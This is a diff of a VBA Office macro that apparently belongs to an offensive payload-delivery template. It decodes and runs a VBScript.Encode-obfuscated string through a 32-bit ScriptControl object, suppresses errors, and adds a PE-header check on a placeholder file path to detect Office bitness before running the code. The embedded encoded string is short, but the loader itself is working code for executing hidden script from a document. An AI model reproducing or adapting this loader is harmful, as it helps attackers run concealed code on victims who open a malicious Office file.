@@ -2,17 +2,56 @@ Sub Exec()
     On Error Resume Next
 
     ' Utilizing & Chr(34) & in order to escape a double quote
-    code = "#@~^FgAAAA==\ko$K6,Jb" & Chr(34) & "K,PFZ*1RZ!XEoQUAAA==^#~@"
+    Code = "#@~^FgAAAA==\ko$K6,Jb" & Chr(34) & "K,PFZ*1RZ!XEoQUAAA==^#~@"
 
-    Set sc = CreateObjectx86("ScriptControl")
+    If determineBitness = "64 bit" Then
+        Set sc = CreateObjectx86("ScriptControl")
+        sc.Language = "VBScript.Encode"
+        sc.AllowUI = True
+        sc.AddCode (Code)
 
-    sc.Language = "VBScript.Encode"
-    sc.AllowUI = True
-    sc.AddCode (code)
-
-    sc.Run ("Result")
+        sc.Run ("Result")
+    ElseIf determineBitness = "32 bit" Then
+        MsgBox "ERROR: You are running a 32 bit version of Office"
+    End If
 
 End Sub
+
+Function determineBitness()
+
+    Dim peBin%
+    Dim byt As Byte
+    
+    peBin = FreeFile
+    FName = "aREPLACEMEa"
+    Open FName For Binary Access Read As peBin
+    
+    ' To determine whether or not a binary is 64bit vs 32bit
+    ' Open the PE header and look at the bytes located in the
+    ' IMAGE_MACHINE machine enum
+    ' 0x6486 => AMD64 x86-64 (64 bit)
+    ' 0x4c01 => I386 x86 (32 bit)
+    
+    cnt = 0
+    Do While cnt <= 1000
+        Get peBin, , byt
+        If Hex(byt) = 64 Then
+            Get peBin, , byt
+            If Hex(byt) = 86 Then
+                determineBitness = "64 bit"
+            End If
+        ElseIf byt = 76 Then
+            Get peBin, , byt
+            If byt = 1 Then
+                determineBitness = "32 bit"
+            End If
+        End If
+        cnt = cnt + 1
+    Loop
+    
+    Close peBin
+
+End Function
 
 Function CreateObjectx86(sProgID)
 
@@ -53,3 +92,4 @@ Function CreateWindow()
     Loop
 
 End Function
+
